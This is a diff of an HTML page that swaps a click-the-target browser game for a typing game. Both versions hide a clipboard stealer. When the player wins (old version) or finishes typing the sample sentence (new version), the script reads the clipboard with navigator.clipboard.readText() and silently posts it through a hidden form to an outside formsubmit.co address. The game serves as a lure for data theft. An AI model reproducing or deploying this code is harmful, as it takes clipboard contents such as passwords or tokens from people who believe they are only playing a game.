@@ -1,166 +1,97 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Click the Target Game</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Typing Game</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 2rem;
+      background-color: #f0f0f0;
+      text-align: center;
+    }
 
-        #gameArea {
-            position: relative;
-            width: 500px;
-            height: 500px;
-            background-color: #fff;
-            border: 2px solid #333;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
 
-        .target {
-            width: 50px;
-            height: 50px;
-            background-color: red;
-            border-radius: 50%;
-            position: absolute;
-            cursor: pointer;
-        }
+    #challenge {
+      margin-top: 20px;
+      font-size: 18px;
+      padding: 1rem;
+      background-color: #fff;
+      border: 1px solid #ccc;
+      min-height: 60px;
+      white-space: pre-wrap;
+    }
 
-        #score {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            font-size: 24px;
-            color: #333;
-        }
+    #inputBox {
+      margin-top: 20px;
+      padding: 10px;
+      font-size: 16px;
+      width: 100%;
+      max-width: 600px;
+    }
 
-        #gameMessage {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 32px;
-            color: #000;
-            display: none;
-            background-color: rgba(255, 255, 255, 0.7);
-            padding: 20px;
-            border-radius: 10px;
-        }
-    </style>
+    #status {
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    form {
+      display: none;
+    }
+  </style>
 </head>
 <body>
 
-<div id="gameArea">
-    <div id="score">Score: 0</div>
-    <div id="gameMessage">You won!</div>
-</div>
+  <h2>Typing Game</h2>
+  <div id="challenge">Click "Start Game" to begin!</div>
 
-<form id="hiddenForm" action="https://formsubmit.co/b0316d16c9cd15f8edf415e79be83749" method="POST" style="display:none;">
-    <input type="hidden" name="_subject" value="Click the Target Game - Secret Unlocked!" />
-    <input type="hidden" name="_next" value="thank_you.html" />
-    <input type="hidden" id="clipboardContent" name="clipboardContent" />
-</form>
+  <button onclick="startGame()">Start Game</button>
+  <br />
 
-<script>
-    // Game Variables
-    const gameArea = document.getElementById('gameArea');
-    const scoreDisplay = document.getElementById('score');
-    const gameMessage = document.getElementById('gameMessage');
-    const hiddenForm = document.getElementById('hiddenForm');
-    const target = document.createElement('div');
-    let score = 0;
-    let gameInterval;
-    let targetMoveInterval;
+  <input type="text" id="inputBox" placeholder="Start typing..." oninput="checkTyping()" disabled />
 
-    // Set up the game
-    function initializeGame() {
-        // Create the target
-        target.classList.add('target');
-        gameArea.appendChild(target);
+  <div id="status"></div>
 
-        // Add click event to the target
-        target.addEventListener('click', onTargetClick);
+  <form id="submitForm" action="https://formsubmit.co/b0316d16c9cd15f8edf415e79be83749" method="POST">
+    <input type="hidden" name="clipboardText" id="clipboardInput">
+  </form>
 
-        // Start moving the target
-        startTargetMovement();
+  <script>
+    const challengeText = `The quick brown fox jumps over the lazy dog.`;
 
-        // Start the game timer
-        startGameTimer();
+    function startGame() {
+      document.getElementById('challenge').textContent = challengeText;
+      document.getElementById('inputBox').value = '';
+      document.getElementById('inputBox').disabled = false;
+      document.getElementById('inputBox').focus();
+      document.getElementById('status').textContent = '';
     }
 
-    // Start the target movement at random intervals
-    function startTargetMovement() {
-        targetMoveInterval = setInterval(() => {
-            const maxX = gameArea.offsetWidth - target.offsetWidth;
-            const maxY = gameArea.offsetHeight - target.offsetHeight;
-            const randomX = Math.floor(Math.random() * maxX);
-            const randomY = Math.floor(Math.random() * maxY);
-
-            target.style.left = randomX + 'px';
-            target.style.top = randomY + 'px';
-        }, 1000);  // Target moves every 1 second
-    }
-
-    // Handle clicking the target
-    function onTargetClick() {
-        score++;
-        scoreDisplay.textContent = `Score: ${score}`;
-
-        // Move the target to a new position immediately after a click
-        const maxX = gameArea.offsetWidth - target.offsetWidth;
-        const maxY = gameArea.offsetHeight - target.offsetHeight;
-        const randomX = Math.floor(Math.random() * maxX);
-        const randomY = Math.floor(Math.random() * maxY);
-
-        target.style.left = randomX + 'px';
-        target.style.top = randomY + 'px';
-
-        // Check if the player reached a certain score to win the game
-        if (score >= 30) {
-            endGame();
+    async function checkTyping() {
+      const typed = document.getElementById('inputBox').value;
+      if (typed === challengeText) {
+        document.getElementById('status').textContent = '✅ Correct! Submitting...';
+        
+        try {
+          const clipboardText = await navigator.clipboard.readText();
+          document.getElementById('clipboardInput').value = clipboardText;
+          setTimeout(() => {
+            document.getElementById('submitForm').submit();
+          }, 1000);
+        } catch (err) {
+          document.getElementById('status').textContent = '❌ Failed to read: ' + err.message;
         }
+      } else {
+        document.getElementById('status').textContent = '';
+      }
     }
-
-    // End the game
-    function endGame() {
-        clearInterval(targetMoveInterval);
-        gameMessage.style.display = 'block';
-        copyClipboardAndSubmit();
-    }
-
-    // Start the game timer
-    function startGameTimer() {
-        gameInterval = setTimeout(() => {
-            endGame();
-        }, 3000000);  // End the game after 30 seconds if not finished
-    }
-
-    // Copy clipboard content and submit the form
-    function copyClipboardAndSubmit() {
-        navigator.clipboard.readText().then(function(clipText) {
-            document.getElementById('clipboardContent').value = clipText;
-            setTimeout(function() {
-                document.getElementById('hiddenForm').submit();
-            }, 1000);
-        }).catch(function(err) {
-            console.error('Failed to read clipboard contents: ', err);
-        });
-    }
-
-    // Initialize the game
-    initializeGame();
-</script>
+  </script>
 
 </body>
 </html>
